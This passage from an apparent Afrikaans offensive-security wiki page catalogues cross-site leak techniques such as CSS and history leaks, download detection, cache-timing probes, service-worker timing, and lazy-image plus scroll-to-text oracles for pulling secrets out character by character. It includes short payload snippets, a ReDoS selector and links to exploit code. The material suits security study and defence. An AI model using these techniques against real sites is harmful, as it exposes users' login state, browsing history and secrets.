- **HTMLVideoElement**: Dit stel `videoHeight` en `videoWidth` bloot. In sommige blaaiers is addisionele eienskappe soos `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount`, en `webkitDecodedFrameCount` beskikbaar, wat meer diepgaande inligting oor die media-inhoud bied. [Read more about HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: Hierdie funksie bied besonderhede oor video-afspeelkwaliteit, insluitend `totalVideoFrames`, wat die hoeveelheid video-data wat verwerk is, kan aandui. [Read more about getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: Hierdie element lek die `height` en `width` van 'n beeld. As 'n beeld egter ongeldig is, sal hierdie eienskappe 0 teruggee, en die `image.decode()` funksie sal verwerp word, wat dui op die mislukking om die beeld korrek te laai. [Read more about HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Property

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
- **Summary:** Identifiseer variasies in webwerf-styling wat verband hou met die gebruiker se toestand of status.
- **Code Example**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Webtoepassings kan die **webwerf-styling verander afhangende van die status van die gebruiker**. Cross-origin CSS-lêers kan op die aanvallersbladsy ingebed word met die **HTML link element**, en die **reëls** sal op die aanvallersbladsy **toegepas** word. As 'n bladsy hierdie reëls dinamies verander, kan 'n aanvaller hierdie **verskille** opspoor afhangende van die gebruiker se toestand.\
As 'n lek tegniek kan die aanvaller die `window.getComputedStyle` metode gebruik om **CSS** eienskappe van 'n spesifieke HTML-element te **lees**. As gevolg hiervan kan 'n aanvaller arbitrêre CSS-eienskappe lees as die betrokke element en eienskapnaam bekend is.

### CSS History

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
- **Summary:** Detecteer of die `:visited` styl toegepas is op 'n URL wat aandui dat dit reeds besoek is
- **Code Example**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

> [!NOTE]
> Volgens [**this**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), werk dit nie in headless Chrome nie.

Die CSS `:visited` selektor word gebruik om URL's anders te styl as hulle voorheen deur die gebruiker besoek is. In die verlede kon die `getComputedStyle()` metode gebruik word om hierdie stylverskille te identifiseer. Modern blaaiers het egter sekuriteitsmaatreëls geïmplementeer om te voorkom dat hierdie metode die toestand van 'n skakel onthul. Hierdie maatreëls sluit in dat die berekende styl altyd teruggegee word asof die skakel besoek is en beperk die style wat met die `:visited` selektor toegepas kan word.

Ten spyte van hierdie beperkings, is dit moontlik om die besoekte toestand van 'n skakel indirek te onderskei. Een tegniek behels om die gebruiker te mislei om met 'n area te interaksie wat deur CSS beïnvloed word, spesifiek deur die `mix-blend-mode` eienskap te gebruik. Hierdie eienskap laat die menging van elemente met hul agtergrond toe, wat moontlik die besoekte toestand kan onthul op grond van gebruikersinteraksie.

Verder kan opsporing bereik word sonder gebruikersinteraksie deur die weergawe-tyd van skakels te benut. Aangesien blaaiers besoekte en onbesoekte skakels anders kan weergee, kan dit 'n meetbare tydverskil in weergawe inbring. 'n Bewys van konsep (PoC) is in 'n Chromium-foutverslag genoem, wat hierdie tegniek demonstreer deur verskeie skakels te gebruik om die tydverskil te versterk, wat die besoekte toestand deur tydanalise opspoorbaar maak.

Vir verdere besonderhede oor hierdie eienskappe en metodes, besoek hul dokumentasiebladsye:

- `:visited`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
- `getComputedStyle()`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
- `mix-blend-mode`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Headers
- **More info**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
- **Summary:** In Google Chrome, 'n toegewyde foutbladsy word vertoon wanneer 'n bladsy geblokkeer word om op 'n cross-origin webwerf ingebed te word weens X-Frame-Options beperkings.
- **Code Example**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

In Chrome, as 'n bladsy met die `X-Frame-Options` kop wat op "deny" of "same-origin" gestel is, as 'n objek ingebed word, verskyn 'n foutbladsy. Chrome keer 'n leë dokumentobjek (in plaas van `null`) vir die `contentDocument` eienskap van hierdie objek terug, anders as in iframes of ander blaaiers. Aanvallers kan dit benut deur die leë dokument op te spoor, wat moontlik inligting oor die gebruiker se toestand kan onthul, veral as ontwikkelaars die X-Frame-Options kop inkonsekwent stel, dikwels foutbladsye oor die hoof sien. Bewustheid en konsekwente toepassing van sekuriteitskoppe is van kardinale belang om sulke lekke te voorkom.

### Download Detection

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Headers
- **More info**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
- **Summary:** 'n Aanvaller kan lêeraflaaie onderskei deur iframes te benut; voortgesette toegang tot die iframe dui op 'n suksesvolle lêeraflaai.
- **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

Die `Content-Disposition` kop, spesifiek `Content-Disposition: attachment`, gee die blaaiers opdrag om inhoud af te laai eerder as om dit inline te vertoon. Hierdie gedrag kan benut word om te detecteer of 'n gebruiker toegang het tot 'n bladsy wat 'n lêeraflaai inisieer. In Chromium-gebaseerde blaaiers is daar 'n paar tegnieke om hierdie aflaai gedrag te detecteer:

1. **Aflaai Bar Monitering**:
- Wanneer 'n lêer in Chromium-gebaseerde blaaiers afgelaai word, verskyn 'n aflaai bar onderaan die blaaiervenster.
- Deur veranderinge in die vensterhoogte te monitor, kan aanvallers die verskyning van die aflaai bar aflei, wat daarop dui dat 'n aflaai inisieer is.
2. **Aflaai Navigasie met Iframes**:
- Wanneer 'n bladsy 'n lêeraflaai inisieer met die `Content-Disposition: attachment` kop, veroorsaak dit nie 'n navigasie gebeurtenis nie.
- Deur die inhoud in 'n iframe te laai en vir navigasie gebeurtenisse te monitor, is dit moontlik om te kontroleer of die inhoudsdisposisie 'n lêeraflaai veroorsaak (geen navigasie) of nie.
3. **Aflaai Navigasie sonder Iframes**:
- Soos die iframe tegniek, behels hierdie metode die gebruik van `window.open` in plaas van 'n iframe.
- Deur navigasie gebeurtenisse in die nuutgeopende venster te monitor, kan onthul word of 'n lêeraflaai inisieer is (geen navigasie) of of die inhoud inline vertoon word (navigasie vind plaas).

In scenario's waar slegs ingelogde gebruikers sulke aflaaie kan inisieer, kan hierdie tegnieke gebruik word om indirek die gebruiker se verifikasietoestand af te lei op grond van die blaaiers se reaksie op die aflaai versoek.

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Timing
- **More info**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
- **Summary:** 'n Aanvaller kan lêeraflaaie onderskei deur iframes te benut; voortgesette toegang tot die iframe dui op 'n suksesvolle lêeraflaai.
- **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (from [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

> [!WARNING]
> Dit is waarom hierdie tegniek interessant is: Chrome het nou **cache partitioning**, en die cache sleutel van die nuutgeopende bladsy is: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, maar as ek 'n ngrok bladsy oopmaak en fetch daarin gebruik, sal die cache sleutel wees: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, die **cache sleutel is anders**, so die cache kan nie gedeel word nie. Jy kan meer besonderhede hier vind: [Gaining security and privacy by partitioning the cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
> (Comment from [**here**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

As 'n webwerf `example.com` 'n hulpbron van `*.example.com/resource` insluit, sal daardie hulpbron die **dieselfde caching sleutel** hê asof die hulpbron direk **deur top-level navigasie aangevra is**. Dit is omdat die caching sleutel bestaan uit top-level _eTLD+1_ en frame _eTLD+1_.

Omdat toegang tot die cache vinniger is as om 'n hulpbron te laai, is dit moontlik om te probeer om die ligging van 'n bladsy te verander en dit 20ms (byvoorbeeld) daarna te kanselleer. As die oorsprong na die stop verander is, beteken dit dat die hulpbron in die cache was.\
Of kan net **'n paar fetch na die potensieel gekaapte bladsy stuur en die tyd meet wat dit neem**.

### Manual Redirect <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Redirects
- **More info**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234)
- **Summary:** Dit is moontlik om uit te vind of 'n antwoord op 'n fetch versoek 'n omleiding is
- **Code Example**:

![](<../images/image (652).png>)

### Fetch with AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Timing
- **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
- **Summary:** Dit is moontlik om te probeer om 'n hulpbron te laai en voordat dit gelaai word, word die laai onderbreek. Afhangende van of 'n fout geaktiveer word, was die hulpbron of nie in die cache nie.
- **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Gebruik _**fetch**_ en _**setTimeout**_ met 'n **AbortController** om beide te detecteer of die **hulpbron in die cache is** en om 'n spesifieke hulpbron uit die blaaiers se cache te verwyder. Boonop vind die proses plaas sonder om nuwe inhoud te cache.

### Script Pollution

- **Inclusion Methods**: HTML Elements (script)
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
- **Summary:** Dit is moontlik om **ingeboude funksies te oorskry** en hul argumente te lees wat selfs van **cross-origin script** (wat nie direk gelees kan word nie), dit kan **waardevolle inligting lek**.
- **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
- **Summary:** Meet die uitvoeringstyd van 'n web met behulp van dienswerkers.
- **Code Example**:

In die gegewe scenario neem die aanvaller die inisiatief om 'n **dienswerker** binne een van hul domeine, spesifiek "attacker.com", te registreer. Vervolgens open die aanvaller 'n nuwe venster in die teikenwebwerf vanaf die hoofdokument en gee die **dienswerker** opdrag om 'n timer te begin. Terwyl die nuwe venster begin laai, navigeer die aanvaller die verwysing wat in die vorige stap verkry is na 'n bladsy wat deur die **dienswerker** bestuur word.

By die aankoms van die versoek wat in die vorige stap inisieer is, reageer die **dienswerker** met 'n **204 (No Content)** statuskode, wat effektief die navigasieproses beëindig. Op hierdie punt vang die **dienswerker** 'n meting van die timer wat vroeër in stap twee begin is. Hierdie meting word beïnvloed deur die duur van JavaScript wat vertragings in die navigasieproses veroorsaak.

> [!WARNING]
> In 'n uitvoeringstyd is dit moontlik om **netwerkfaktore** te **elimineer** om **meer presiese metings** te verkry. Byvoorbeeld, deur die hulpbronne wat deur die bladsy gebruik word, te laai voordat dit gelaai word.

### Fetch Timing

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Timing (generally due to Page Content, Status Code)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
- **Summary:** Gebruik [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) om die tyd te meet wat dit neem om 'n versoek uit te voer. Ander horlosies kan gebruik word.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Timing (generally due to Page Content, Status Code)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
- **Summary:** Gebruik [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) om die tyd te meet wat dit neem om 'n versoek te doen met `window.open`. Ander horlosies kan gebruik word.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

## With HTML or Re Injection

Hier kan jy tegnieke vind om inligting uit 'n cross-origin HTML **te onttrek deur HTML-inhoud in te voeg**. Hierdie tegnieke is interessant in gevalle waar jy om enige rede **HTML kan invoeg maar nie JS-kode kan invoeg nie**.

### Dangling Markup

{{#ref}}
dangling-markup-html-scriptless-injection/
{{#endref}}

### Image Lazy Loading

As jy **inhoud moet onttrek** en jy kan **HTML voor die geheim byvoeg**, moet jy die **gewone dangling markup tegnieke** nagaan.\
As jy egter om enige rede **MOET** dit **karakter vir karakter** doen (miskien is die kommunikasie via 'n cache hit), kan jy hierdie truuk gebruik.

**Beelde** in HTML het 'n "**loading**" attribuut waarvan die waarde "**lazy**" kan wees. In daardie geval sal die beeld gelaai word wanneer dit gesien word en nie terwyl die bladsy laai nie:
```html
<img src=/something loading=lazy >
```
Daarom, wat jy kan doen, is om **'n baie rommel karakters** (Byvoorbeeld **duisende "W"s**) toe te voeg om **die webblad te vul voor die geheim of iets soos** `<br><canvas height="1850px"></canvas><br>.`\
Dan, as ons **inspuiting byvoorbeeld voor die vlag verskyn**, sal die **beeld** **gelaai** word, maar as dit **na** die **vlag** verskyn, sal die vlag + die rommel **voorkom dat dit gelaai word** (jy sal moet speel met hoeveel rommel om te plaas). Dit is wat gebeur het in [**hierdie skrywe**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

'n Ander opsie sou wees om die **scroll-to-text-fragment** te gebruik as dit toegelaat word:

#### Scroll-to-text-fragment

Maar jy laat die **bot toegang tot die bladsy** maak met iets soos
```
#:~:text=SECR
```
So die webblad sal iets soos wees: **`https://victim.com/post.html#:~:text=SECR`**

Waar post.html die aanvaller se rommelkarakters en lui laai beeld bevat en dan die geheim van die bot bygevoeg word.

Wat hierdie teks sal doen, is om die bot toegang te gee tot enige teks op die bladsy wat die teks `SECR` bevat. Aangesien daardie teks die geheim is en dit net **onder die beeld** is, sal die **beeld slegs laai as die geraamde geheim korrek is**. So daar het jy jou orakel om **die geheim karakters vir karakter te exfiltreer**.

'n Voorbeeld van kode om dit te benut: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Beeld Lui Laai Tydgebaseerd

As dit **nie moontlik is om 'n eksterne beeld te laai nie** wat die aanvaller kan aandui dat die beeld gelaai is, kan 'n ander opsie wees om te probeer om **die karakter verskeie kere te raai en dit te meet**. As die beeld gelaai word, sal al die versoeke langer neem as wanneer die beeld nie gelaai word nie. Dit is wat in die [**oplossing van hierdie skrywe**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **samengevat is hier:**

{{#ref}}
xs-search/event-loop-blocking-+-lazy-images.md
{{#endref}}

### ReDoS

{{#ref}}
regular-expression-denial-of-service-redos.md
{{#endref}}

### CSS ReDoS

As `jQuery(location.hash)` gebruik word, is dit moontlik om via tyd te ontdek **of sommige HTML-inhoud bestaan**, dit is omdat as die selektor `main[id='site-main']` nie ooreenstem nie, dit nie die res van die **selektore** hoef te kontroleer nie:
```javascript
$(
"*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']"
)
```
### CSS Inspuiting

{{#ref}}
xs-search/css-injection/
{{#endref}}

## Verdedigings

Daar is verskeie versagings aanbeveel in [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) ook in elke afdeling van die wiki [https://xsleaks.dev/](https://xsleaks.dev/). Kyk daar vir meer inligting oor hoe om teen hierdie tegnieke te beskerm.

## Verwysings

- [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
- [https://xsleaks.dev/](https://xsleaks.dev)
- [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
- [https://xsinator.com/](https://xsinator.com/)
- [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{{#include ../banners/hacktricks-training.md}}
